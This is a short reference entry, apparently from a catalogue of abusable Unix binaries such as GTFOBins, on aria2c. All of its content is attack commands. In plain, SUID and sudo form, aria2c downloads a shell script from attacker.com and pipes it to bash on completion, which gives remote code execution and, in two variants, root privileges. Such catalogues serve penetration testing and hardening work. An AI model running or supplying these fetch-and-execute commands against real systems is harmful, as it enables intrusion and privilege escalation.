---
description: |
  Note that the subprocess is immediately sent to the background.

  The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed.
functions:
  execute-non-interactive:
    - code: aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
  suid-enabled:
    - code: ./aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
  sudo-enabled:
    - code: sudo aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
---
